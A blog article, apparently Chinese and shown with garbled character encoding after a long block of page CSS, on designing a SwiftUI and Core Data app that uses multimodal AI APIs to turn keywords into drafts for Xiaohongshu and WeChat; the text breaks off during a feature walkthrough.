.35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">ä¸ºä»€ä¹ˆä½ éœ€è¦ä¸€ä¸ªâ€œå†…å®¹æ“ä½œç³»ç»Ÿâ€ï¼Ÿç”¨ SwiftUI æ‰“é€ è·¨å¹³å° AI å†…å®¹ç”Ÿæˆå™¨</h2>
<p>åœ¨ä»Šå¤©çš„å†…å®¹åˆ›ä½œç”Ÿæ€ä¸­ï¼Œä¸€ä¸ªæ®‹é…·çš„ç°å®æ‘†åœ¨æ¯ä½åˆ›ä½œè€…é¢å‰ï¼š<strong>ä½ ä¸èƒ½åªåœ¨ä¸€ä¸ªå¹³å°å‘å£°</strong>ã€‚å°çº¢ä¹¦éœ€è¦é«˜é¢œå€¼çš„ä¹å®«æ ¼å›¾æ–‡ï¼Œå¾®ä¿¡å…¬ä¼—å·åˆ™æœŸå¾…é€»è¾‘ä¸¥å¯†çš„é•¿æ–‡ï¼›æŠ–éŸ³è¿½æ±‚å¿«èŠ‚å¥çš„æƒ…ç»ªå†²å‡»ï¼Œè€Œè§†é¢‘å·åˆå¸Œæœ›ä½ å…¼é¡¾æ·±åº¦ä¸ä¼ æ’­ã€‚è¿™ç§â€œå¤šå¹³å°åˆ†å‘â€çš„å¸¸æ€ï¼Œæ­£åœ¨å°†åˆ›ä½œè€…æ‹–å…¥ä¸€åœºæ— ä¼‘æ­¢çš„æ ¼å¼è½¬æ¢ä¸å†…å®¹é‡å†™æ³¥æ½­ã€‚</p>
<p>æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œè®©åˆ›ä½œå›å½’æœ¬è´¨ï¼Œè€Œå°†ç¹ççš„æ ¼å¼é€‚é…äº¤ç»™å·¥å…·ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚æœ¬æ–‡å°†ä¸ºä½ æ­ç¤ºå¦‚ä½•åˆ©ç”¨ <strong>SwiftUI + Core Data + å¤šæ¨¡æ€ AI</strong>ï¼Œæ„å»ºä¸€ä¸ªçœŸæ­£å±äºåˆ›ä½œè€…çš„â€œå†…å®¹æ“ä½œç³»ç»Ÿâ€â€”â€”ä¸€ä¸ªèƒ½åœ¨ iOS ä¸ macOS ä¸Šæ— ç¼è¿è¡Œã€æœ¬åœ°ä¼˜å…ˆã€AI è¾…åŠ©ã€ä¸€é”®å¯¼å‡ºå¤šå¹³å°æ ¼å¼çš„æ™ºèƒ½å†…å®¹ç”Ÿæˆå™¨ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å†…å®¹åˆ›ä½œè€…çš„â€œå¤šå¹³å°å›°å¢ƒâ€ï¼šå°çº¢ä¹¦ vs å…¬ä¼—å·</h3>
<p>è¦è®¾è®¡ä¸€æ¬¾çœŸæ­£è§£å†³ç—›ç‚¹çš„å·¥å…·ï¼Œé¦–å…ˆå¿…é¡»æ·±åˆ»ç†è§£ç›®æ ‡å¹³å°çš„å†…å®¹åŸºå› ã€‚</p>
<p><strong>å°çº¢ä¹¦</strong> æ˜¯ä¸€ä¸ªä»¥â€œè§†è§‰é©±åŠ¨â€ä¸ºæ ¸å¿ƒçš„ç¤¾åŒºã€‚ç”¨æˆ·æ»‘åŠ¨å±å¹•çš„é€Ÿåº¦æå¿«ï¼Œå†³å®šæ˜¯å¦åœç•™çš„å…³é”®å¾€å¾€åœ¨å‰0.5ç§’ã€‚å› æ­¤ï¼Œå†…å®¹å¿…é¡»å…·å¤‡ï¼š</p>
<ul>
<li><strong>å¼ºè§†è§‰å¸å¼•åŠ›</strong>ï¼šé«˜æ¸…ã€ç»Ÿä¸€è‰²è°ƒã€æ„å›¾ç²¾ç¾çš„å›¾ç‰‡æ˜¯åŸºç¡€ã€‚</li>
<li><strong>çˆ†æ¬¾æ ‡é¢˜</strong>ï¼šé€šå¸¸åŒ…å«æƒ…ç»ªè¯ï¼ˆâ€œç»äº†ï¼â€ã€â€œæ•‘å‘½ï¼â€ï¼‰ã€æ•°å­—ï¼ˆâ€œ3æ­¥æå®šâ€ï¼‰ã€ç—›ç‚¹ç›´å‡»ï¼ˆâ€œå†ä¹Ÿä¸æ€•â€¦â€ï¼‰ã€‚</li>
<li><strong>æ ‡ç­¾ç²¾å‡†</strong>ï¼š#OOTDã€#å¥½ç‰©åˆ†äº«ã€#å¹²è´§ ç­‰æ ‡ç­¾æ˜¯æµé‡çš„å…¥å£ã€‚</li>
<li><strong>å†…å®¹è½»é‡åŒ–</strong>ï¼šæ­£æ–‡é€šå¸¸ç®€çŸ­ï¼Œæ ¸å¿ƒä¿¡æ¯åœ¨å›¾ç‰‡ä¸­å‘ˆç°ï¼Œå½¢æˆâ€œä¹å®«æ ¼å™äº‹â€ã€‚</li>
</ul>
<p>åè§‚ <strong>å¾®ä¿¡å…¬ä¼—å·</strong>ï¼Œå®ƒæ›´åƒä¸€ä¸ªâ€œæ€æƒ³æ²‰æ·€â€çš„åœºåŸŸã€‚è¯»è€…æ„¿æ„èŠ±æ—¶é—´é˜…è¯»ï¼ŒæœŸå¾…çš„æ˜¯ï¼š</p>
<ul>
<li><strong>ç»“æ„æ¸…æ™°çš„é•¿æ–‡</strong>ï¼šæœ‰å¼•è¨€ã€è®ºç‚¹ã€è®ºæ®ã€ç»“è®ºã€‚</li>
<li><strong>æ·±åº¦ä¸ä»·å€¼</strong>ï¼šæä¾›ç‹¬åˆ°è§è§£ã€ç³»ç»Ÿæ–¹æ³•è®ºæˆ–è¯¦å®æ•°æ®ã€‚</li>
<li><strong>ä¸“ä¸šæ’ç‰ˆ</strong>ï¼šæ®µè½åˆ†æ˜ã€é‡ç‚¹çªå‡ºã€å¼•ç”¨è§„èŒƒï¼ŒMarkdown æ˜¯è®¸å¤šåˆ›ä½œè€…çš„é¦–é€‰æ ¼å¼ã€‚</li>
<li><strong>å“ç‰Œä¸€è‡´æ€§</strong>ï¼šæ–‡é£ã€è§†è§‰é£æ ¼éœ€é•¿æœŸç¨³å®šï¼Œå»ºç«‹ä¿¡ä»»ã€‚</li>
</ul>
<p>è¿™ä¸¤ç§æˆªç„¶ä¸åŒçš„å†…å®¹èŒƒå¼ï¼Œè¿«ä½¿åˆ›ä½œè€…åœ¨åŒä¸€ä¸ªåˆ›æ„ä¸‹ï¼Œè¿›è¡Œä¸¤æ¬¡ç”šè‡³å¤šæ¬¡çš„â€œå†åˆ›ä½œâ€ã€‚è¿™ä¸ä»…æ˜¯æ—¶é—´çš„æµªè´¹ï¼Œæ›´æ˜¯åˆ›é€ åŠ›çš„æŸè€—ã€‚</p>
<h3 data-id="heading-2">äºŒã€æå‡ºè§£å†³æ–¹æ¡ˆï¼šâ€œå†…å®¹æ“ä½œç³»ç»Ÿâ€çš„æ¦‚å¿µ</h3>
<p>æˆ‘ä»¬ä¸å¦¨è·³å‡ºâ€œå·¥å…·â€çš„æ€ç»´ï¼Œå¼•å…¥â€œæ“ä½œç³»ç»Ÿâ€çš„è§†è§’ã€‚ä¸€ä¸ªä¼˜ç§€çš„æ“ä½œç³»ç»Ÿï¼Œåº”è¯¥èƒ½ï¼š</p>
<ol>
<li><strong>ç»Ÿä¸€ç®¡ç†æ ¸å¿ƒèµ„äº§</strong>ï¼ˆä½ çš„åˆ›æ„ã€è‰ç¨¿ã€ç´ æï¼‰ã€‚</li>
<li><strong>æä¾›å¼ºå¤§çš„ç”Ÿäº§åŠ›æ¥å£</strong>ï¼ˆAI è¾…åŠ©ç”Ÿæˆï¼‰ã€‚</li>
<li><strong>æ— ç¼é€‚é…ä¸åŒâ€œç¡¬ä»¶â€</strong>ï¼ˆå°çº¢ä¹¦ã€å…¬ä¼—å·ç­‰å¹³å°ï¼‰ã€‚</li>
</ol>
<p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬æ„æƒ³çš„ AI å†…å®¹ç”Ÿæˆå™¨ï¼Œå…¶æ ¸å¿ƒä¸æ˜¯å–ä»£åˆ›ä½œè€…ï¼Œè€Œæ˜¯æˆä¸ºåˆ›ä½œè€…çš„â€œç¬¬äºŒå¤§è„‘â€å’Œâ€œæ ¼å¼ç¿»è¯‘å®˜â€ã€‚å®ƒå°†ä¸€æ¬¡æ€§çš„åˆ›æ„è¾“å…¥ï¼Œé«˜æ•ˆåœ°è½¬åŒ–ä¸ºç¬¦åˆå„å¹³å°è°ƒæ€§çš„è¾“å‡ºã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€æŠ€æœ¯æ¶æ„è¯¦è§£ï¼šSwiftUI + Core Data + AI API çš„æ•´åˆé€»è¾‘</h3>
<h4 data-id="heading-4">1. å…±äº«æ•°æ®æ¨¡å‹ï¼šCore Data çš„å¨åŠ›</h4>
<p>æ•´ä¸ªåº”ç”¨çš„åŸºçŸ³æ˜¯ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„ <strong>Core Data æ•°æ®æ¨¡å‹</strong>ã€‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ ¸å¿ƒå®ä½“ <code>ContentDraft</code>ï¼Œå®ƒåŒ…å«ä»¥ä¸‹å…³é”®å±æ€§ï¼š</p>
<ul>
<li><code>title</code>: æ ¸å¿ƒæ ‡é¢˜ï¼ˆAI ç”Ÿæˆåå¯æ‰‹åŠ¨ä¿®æ”¹ï¼‰ã€‚</li>
<li><code>keywords</code>: åˆ›æ„å…³é”®è¯ï¼ˆç”¨æˆ·çš„åŸå§‹è¾“å…¥ï¼‰ã€‚</li>
<li><code>longFormContent</code>: é•¿æ–‡æ­£æ–‡ï¼ˆç”¨äºå…¬ä¼—å·ï¼‰ã€‚</li>
<li><code>shortNotes</code>: çŸ­å›¾æ–‡æ¡ˆï¼ˆç”¨äºå°çº¢ä¹¦ï¼‰ã€‚</li>
<li><code>imageSuggestions</code>: ä¸€ä¸ªå…³ç³»å‹å­å®ä½“ï¼Œå­˜å‚¨ AI å»ºè®®çš„é…å›¾æè¿°ï¼ˆå¦‚â€œæ˜äº®å¨æˆ¿ï¼Œä¸€æ¯å’–å•¡ï¼Œç¬”è®°æœ¬ç”µè„‘ï¼Œçª—å¤–é˜³å…‰â€ï¼‰ã€‚</li>
<li><code>platformTags</code>: å¹³å°ç‰¹å®šçš„æ ‡ç­¾å»ºè®®ã€‚</li>
</ul>
<p>å¾—ç›Šäº Core Data å¯¹ Apple å…¨å¹³å°çš„åŸç”Ÿæ”¯æŒï¼Œè¿™ä¸ªæ•°æ®æ¨¡å‹å¯ä»¥<strong>æ— ç¼å…±äº«äº iOS å’Œ macOS åº”ç”¨ä¹‹é—´</strong>ã€‚ä½ åœ¨ iPhone ä¸Šè®°å½•çš„çµæ„Ÿï¼Œå›åˆ°å®¶æ‰“å¼€ Macï¼Œç«‹åˆ»å°±èƒ½åœ¨æ›´å¤§çš„å±å¹•ä¸Šç»§ç»­ç¼–è¾‘å’Œå®Œå–„ã€‚æ‰€æœ‰æ•°æ®éƒ½æŒä¹…åŒ–åœ¨æœ¬åœ°ï¼Œæ— éœ€æ‹…å¿ƒç½‘ç»œå»¶è¿Ÿæˆ–æœåŠ¡å™¨æ•…éšœã€‚</p>
<h4 data-id="heading-5">2. å¹³å°ç‰¹å®š UIï¼šSwiftUI çš„å£°æ˜å¼ä¼˜åŠ¿</h4>
<p>SwiftUI çš„å£°æ˜å¼è¯­æ³•å’Œå¼ºå¤§çš„çŠ¶æ€ç®¡ç†ï¼Œè®©æˆ‘ä»¬èƒ½è½»æ¾å®ç°â€œä¸€å¥—é€»è¾‘ï¼Œä¸¤å¥—ç•Œé¢â€ã€‚</p>
<ul>
<li><strong>åœ¨ iOS ä¸Š</strong>ï¼Œç•Œé¢è®¾è®¡ä¸ºå¿«é€Ÿæ•æ‰çµæ„Ÿçš„ç§»åŠ¨ä¼˜å…ˆä½“éªŒã€‚ä¸»ç•Œé¢æ˜¯ä¸€ä¸ªå¡ç‰‡æµï¼Œç‚¹å‡»å³å¯è¿›å…¥ç¼–è¾‘ã€‚åº•éƒ¨æœ‰é†’ç›®çš„â€œAI ç”Ÿæˆâ€æŒ‰é’®ï¼Œä¸€é”®æ ¹æ®å…³é”®è¯å¡«å……æ ‡é¢˜ã€æ­£æ–‡å’Œé…å›¾å»ºè®®ã€‚</li>
<li><strong>åœ¨ macOS ä¸Š</strong>ï¼Œç•Œé¢åˆ™è½¬å˜ä¸ºç”Ÿäº§åŠ›å·¥ä½œç«™ã€‚é‡‡ç”¨ä¾§è¾¹æ å¯¼èˆªï¼Œä¸»åŒºåŸŸæ˜¯å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå³ä¾§æ˜¯ AI å»ºè®®é¢æ¿ï¼Œå¯ä»¥å®æ—¶é¢„è§ˆä¸åŒå¹³å°çš„å¯¼å‡ºæ•ˆæœã€‚</li>
</ul>
<p>é€šè¿‡ <code>@Environment(\.horizontalSizeClass)</code> ç­‰ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä¼˜é›…åœ°å¤„ç†ä¸åŒå±å¹•å°ºå¯¸ä¸‹çš„å¸ƒå±€å˜åŒ–ï¼Œç¡®ä¿åœ¨ iPadã€MacBookã€iMac ä¸Šéƒ½æœ‰æœ€ä½³ä½“éªŒã€‚</p>
<h4 data-id="heading-6">3. AI é›†æˆï¼šå¤šæ¨¡æ€ API çš„æ™ºèƒ½èµ‹èƒ½</h4>
<p>è¿™æ˜¯å·¥å…·çš„â€œæ™ºèƒ½â€æ‰€åœ¨ã€‚æˆ‘ä»¬é€‰æ‹©æ¥å…¥å¦‚ <strong>é€šä¹‰åƒé—®ï¼ˆQwen-VLï¼‰</strong> æˆ– <strong>æ–‡å¿ƒä¸€è¨€</strong> è¿™ç±»æ”¯æŒå¤šæ¨¡æ€çš„ APIã€‚</p>
<ul>
<li><strong>å·¥ä½œæµ</strong>ï¼šå½“ç”¨æˆ·è¾“å…¥å…³é”®è¯ï¼ˆå¦‚â€œæ˜¥å­£æŠ¤è‚¤â€ï¼‰å¹¶ç‚¹å‡»â€œç”Ÿæˆâ€æ—¶ï¼Œåº”ç”¨ä¼šå‘ API å‘é€ä¸€ä¸ªç»“æ„åŒ–è¯·æ±‚ã€‚</li>
<li><strong>API å“åº”</strong>ï¼šä¸€ä¸ª JSON å¯¹è±¡ï¼ŒåŒ…å«ï¼š
<ul>
<li><code>suggested_title</code>: â€œæ˜¥å­£æŠ¤è‚¤å¤§ä½œæˆ˜ï¼3ä¸ªæ­¥éª¤è®©ä½ å‘Šåˆ«å¹²ç‡¥æš—æ²‰â€</li>
<li><code>long_form_content</code>: ä¸€ç¯‡800å­—å·¦å³çš„å…¬ä¼—å·é£æ ¼æ–‡ç« ã€‚</li>
<li><code>short_notes</code>: â€œæ˜¥å¤©æ¥äº†ï¼Œçš®è‚¤åˆå¹²åˆæ²¹ï¼Ÿè¯•è¯•è¿™3æ‹›ï¼#æ˜¥å­£æŠ¤è‚¤ #æŠ¤è‚¤å¹²è´§â€</li>
<li><code>image_suggestions</code>: ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ åŒ…å« <code>description</code>ï¼ˆæ–‡å­—æè¿°ï¼‰å’Œ <code>layout_hint</code>ï¼ˆå¦‚â€œå·¦ä¸Šè§’å åŠ æ–‡æ¡ˆâ€ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<p>æ‰€æœ‰è¿™äº› AI ç”Ÿæˆçš„å†…å®¹ï¼Œéƒ½ä¼šè¢«å¡«å……åˆ° <code>ContentDraft</code> å®ä½“ä¸­ï¼Œä¾›ç”¨æˆ·å®¡é˜…ã€ä¿®æ”¹å’Œé‡‡çº³ã€‚<strong>å…³é”®åœ¨äºï¼ŒAI æ˜¯åŠ©æ‰‹ï¼Œå†³ç­–æƒå§‹ç»ˆåœ¨ç”¨æˆ·æ‰‹ä¸­ã€‚</strong></p>
<h3 data-id="heading-7">å››ã€åŠŸèƒ½æ¼”ç¤ºï¼šä»è¾“å…¥åˆ°å¯¼å‡ºçš„å…¨æµç¨‹</h3>
<p>æƒ³è±¡ä¸€ä¸‹è¿™ä¸ªåœºæ™¯ï¼š</p>
<ol>
<li><strong>è¾“å…¥</strong>ï¼šä½ åœ¨ iPhone ä¸Šæ‰“å¼€ Appï¼Œè¾“å…¥å…³é”®è¯â€œå‘¨æœ«éœ²è¥è£…å¤‡æ¸…å•â€ã€‚</li>
<li><strong>AI ç”Ÿæˆ</strong>ï¼šç‚¹å‡»æŒ‰é’®ï¼Œå‡ ç§’å†…ï¼ŒAI ä¸ºä½ ç”Ÿæˆäº†ä¸€ä¸ªå¸ç›æ ‡é¢˜ã€ä¸€ä»½è¯¦ç»†çš„å…¬ä¼—å·é•¿æ–‡ï¼ˆåŒ…å«è£…å¤‡æ¨èç†ç”±å’Œè´­ä¹°é“¾æ¥å»ºè®®ï¼‰ï¼Œä»¥åŠä¸€æ¡é€‚åˆå°çº¢ä¹¦çš„çŸ­æ–‡æ¡ˆå’Œä¸‰å¼ é…å›¾å»ºè®®ï¼ˆâ€œå¸ç¯·ç‰¹å†™â€ã€â€œè¥åœ°å…¨æ™¯â€ã€â€œç¾é£Ÿæ‘†æ‹â€ï¼‰ã€‚</li>
